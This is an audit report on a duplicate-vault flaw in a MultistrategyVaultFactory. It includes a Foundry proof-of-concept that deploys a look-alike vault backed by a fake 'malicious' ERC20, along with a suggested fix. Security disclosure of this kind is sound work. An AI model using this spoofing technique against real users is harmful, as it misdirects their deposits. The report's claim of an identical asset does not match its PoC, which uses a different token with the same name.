## Title

Missing uniqueness in MultistrategyVaultFactory allows duplicate vaults with identical metadata and user-fund misdirection

## Summary

The `MultistrategyVaultFactory` uses a salt that includes `msg.sender`, which prevents only per-deployer duplicates. This allows any attacker to deploy a vault with the same asset, name, and symbol as an existing one, producing indistinguishable ERC20 share tokens at a different address. Such duplicates will misdirect user deposits or confuse integrators relying on factory events, exposing users to fund loss through interaction with attacker-controlled vaults.

## Finding Description

The `MultistrategyVaultFactory` is intended to provide deterministic, parameter-based deployment of new vaults. However, the salt used for `create2` includes the caller’s address (`msg.sender`), which only prevents duplicate deployments **per deployer**. This means that two different EOAs can deploy vaults with the same `(asset, name, symbol)` and obtain two separate contracts that appear indistinguishable by metadata.

From `deployNewVault`:

```solidity
        bytes32 salt = keccak256(abi.encode(msg.sender, asset, _name, symbol));
        address vaultAddress = _createClone(VAULT_ORIGINAL, salt);
```

The factory emits an event that only provides the new vault and its asset:

```solidity
    emit NewVault(vaultAddress, asset);
```

Since the event does not encode `msg.sender` or any unique disambiguator, indexers or UIs relying on this event will observe two vaults with the same `asset, name, and symbol` but different addresses. The ERC20 metadata of the vault share tokens will also be identical, making the duplicates indistinguishable without deeper off-chain validation.

This breaks the guarantee that a given `(asset, name, symbol)` triple maps to a **single canonical vault**. Instead, the protocol allows multiple vaults with identical visible metadata to exist, opening the door to misdirection of deposits and confusion in integration layers.

Other leading protocols enforce uniqueness at the factory level to avoid this class of bug. For example, **Morpho Blue** derives a canonical market identifier by hashing its `MarketParams` struct via `keccak256(marketParams, MARKET_PARAMS_BYTES_LENGTH)`, returning an `Id` that uniquely keys markets. This enforces “one parameter set → one canonical instance” at the factory/registry layer.

## Impact Explanation

While the vulnerability does not automatically drain funds from the real vault, it exposes users to realistic fund misdirection and integration errors, since both vaults are valid ERC4626s with indistinguishable metadata. This fits “Minor fund loss/exposure” and “Breaks non-core functionality” impact categories, which place the issue in **Medium** impact.

## Likelihood Explanation

The issue can be triggered by any user without constraint: a malicious actor only needs to call deployNewVault with parameters matching an existing vault, using a different EOA. There are no barriers to exploitation — no capital requirements, privileged roles, or special timing conditions. Given this, the likelihood of exploitation is **High**.

## Proof of Concept

Reproduction steps:

1. Deploy Vault A (EOA-A):

From the test’s default sender, call
`factory.deployNewVault(address(token), "Vault A", "vA", roleManager, 7 days)`.

This emits `NewVault(vaultA, token)` and deploys a clone whose ERC20 share metadata is "Vault A" / "vA".

2. Deploy Vault B (EOA-B):

Create a second ERC20 mock maliciousToken that also reports name="Mock USDC", symbol="mUSDC".

`vm.prank(badLarry)` to switch sender to a different EOA.

Call
`factory.deployNewVault(address(maliciousToken), "Vault A", "vA", roleManager, 7 days)`.

Because the salt is `keccak256(msg.sender, asset, name, symbol)`, this succeeds and emits `NewVault(vaultB, maliciousToken)` at a different address.

3. Decode events & read metadata:

Use `vm.getRecordedLogs()` to grab both `NewVault(address,address)` events.

For each `(vault, asset)` pair, read:

`IMultistrategyVault(vault).name() and .symbol()` → both are "Vault A" / "vA".

`IERC20Metadata(asset).name() and .symbol()` → both are "Mock USDC" / "mUSDC".

This proves the factory only enforces per-deployer uniqueness and permits duplicate, indistinguishable vaults across different EOAs.

## Proof of Code

1. Place code in `test/FactoryDupe.t.sol`.

2. Run `forge test --mt test_TwoVaultsSameSymbols -vv`

3. You’ll see output similar to:

```
  Vault/Asset addresses: 0xb4eabdd1b3F0d9b5Ca05f9A7943AbEE1a80d550a 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  Vault name: Vault A Symbol: vA
  Asset name: Mock USDC Symbol: mUSDC
  Vault/Asset addresses: 0x1CFfA901137e64CDf93276C0d1c03EF0728a1D2f 0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
  Vault name: Vault A Symbol: vA
  Asset name: Mock USDC Symbol: mUSDC
```

The code:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {MultistrategyVault} from "src/core/MultistrategyVault.sol";
import {MultistrategyVaultFactory} from "src/factories/MultistrategyVaultFactory.sol";
import {IMultistrategyVault} from "src/core/interfaces/IMultistrategyVault.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

// Simple mintable ERC20 for the test
contract ERC20Mock {
    string public name = "Mock USDC";
    string public symbol = "mUSDC";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract MaliciousERC20Mock {
    string public name = "Mock USDC"; // Same name
    string public symbol = "mUSDC"; // Same symbol
    uint8 public decimals = 6;

    function mint(address to, uint256 amt) external {
        // yeah, no
    }
}

contract FactoryDupe is Test {
    ERC20Mock token;
    MultistrategyVault impl;
    MultistrategyVaultFactory factory;

    address governance = address(0xBEEF);
    address roleManager = address(0xCAFE);

    function setUp() public {
        token = new ERC20Mock();

        // Deploy the implementation to be cloned by the factory.
        impl = new MultistrategyVault();

        // Constructor is (string name, address VAULT_ORIGINAL, address governance)
        factory = new MultistrategyVaultFactory("Octant Factory", address(impl), governance);
    }

    function test_TwoVaultsSameSymbols() public {
        MaliciousERC20Mock maliciousToken = new MaliciousERC20Mock();

        // Prepare to “index” the event (simulate an indexer)
        vm.recordLogs();

        // Call the real API
        string memory shareName = "Vault A";
        string memory shareSym = "vA";
        uint256 profitMaxUnlock = 7 days;

        address vaultAddr = factory.deployNewVault(address(token), shareName, shareSym, roleManager, profitMaxUnlock);

        // Verify something real was deployed
        assertTrue(vaultAddr.code.length > 0, "clone not deployed");

        // Read back metadata from the clone (what a UI/indexer would later resolve)
        string memory onchainName = IMultistrategyVault(vaultAddr).name();
        string memory onchainSymbol = IMultistrategyVault(vaultAddr).symbol();
        assertEq(onchainName, shareName);
        assertEq(onchainSymbol, shareSym);
        assertEq(IMultistrategyVault(vaultAddr).asset(), address(token));

        // --- deploy vault B from a DIFFERENT EOA (badLarry) but with SAME visible params ---
        address badLarry = address(0xBADC0FFEE0A);
        vm.prank(badLarry);
        /*address vaultB =*/
        factory.deployNewVault(address(maliciousToken), shareName, shareSym, roleManager, profitMaxUnlock);

        // Decode emitted logs like an indexer
        Vm.Log[] memory logs = vm.getRecordedLogs();

        address[2] memory evVaults;
        address[2] memory evAssets;
        uint256 idx;
        for (uint256 i = 0; i < logs.length; i++) {
            // topic0 = keccak256("NewVault(address,address)")
            if (logs[i].topics.length == 3 && logs[i].topics[0] == keccak256("NewVault(address,address)")) {
                evVaults[idx] = address(uint160(uint256(logs[i].topics[1])));
                evAssets[idx] = address(uint160(uint256(logs[i].topics[2])));

                //console2.log("=== NewVault event decoded ===");
                console2.log("Vault/Asset addresses:", evVaults[idx], evAssets[idx]);
                console2.log(
                    "Vault name:",
                    IMultistrategyVault(evVaults[idx]).name(),
                    "Symbol:",
                    IMultistrategyVault(evVaults[idx]).symbol()
                );
                console2.log(
                    "Asset name:",
                    IERC20Metadata(evAssets[idx]).name(),
                    "Symbol:",
                    IERC20Metadata(evAssets[idx]).symbol()
                );

                idx++;
                if (idx == 2) break;
            }
        }

        // ensure we got two events
        assertEq(idx, 2, "did not capture two NewVault events");

        // compare vault metadata: must be the same
        string memory vNameA = IMultistrategyVault(evVaults[0]).name();
        string memory vNameB = IMultistrategyVault(evVaults[1]).name();
        string memory vSymA = IMultistrategyVault(evVaults[0]).symbol();
        string memory vSymB = IMultistrategyVault(evVaults[1]).symbol();
        assertEq(vNameA, vNameB, "vault names differ");
        assertEq(vSymA, vSymB, "vault symbols differ");

        // compare asset metadata: must be the same
        string memory aNameA = IERC20Metadata(evAssets[0]).name();
        string memory aNameB = IERC20Metadata(evAssets[1]).name();
        string memory aSymA = IERC20Metadata(evAssets[0]).symbol();
        string memory aSymB = IERC20Metadata(evAssets[1]).symbol();
        assertEq(aNameA, aNameB, "asset names differ");
        assertEq(aSymA, aSymB, "asset symbols differ");

        // But different contract addresses (the crux: two indistinguishable-looking vaults at different addrs)
        assertTrue(evVaults[0] != evVaults[1], "vault addresses unexpectedly equal");
        assertTrue(evAssets[0] != evAssets[1], "asset addresses unexpectedly equal");
    }
}
```

## Recommendation

Enforce global uniqueness at the factory by keying deployments on a canonical parameter hash (not on `msg.sender`) and rejecting duplicates. Also surface this canonical key in events so indexers/UIs can pin the one true address.

```solidity
function deployNewVault(...) external returns (address vaultAddress) {
        bytes32 paramHash = _paramHash(asset, _name, symbol, roleManager, profitMaxUnlockTime);

        address existing = deployedByParamHash[paramHash];
        if (existing != address(0)) revert VaultAlreadyExists(paramHash, existing);

        vaultAddress = _createClone(VAULT_ORIGINAL, paramHash);
```

* Using `paramHash` as both the salt and the registry key guarantees one-and-only-one deployment per parameter set. 

* Also expose `paramHash` in the event to provide a stable anchor for integrators (similar to Morpho Blue’s market `Id`).
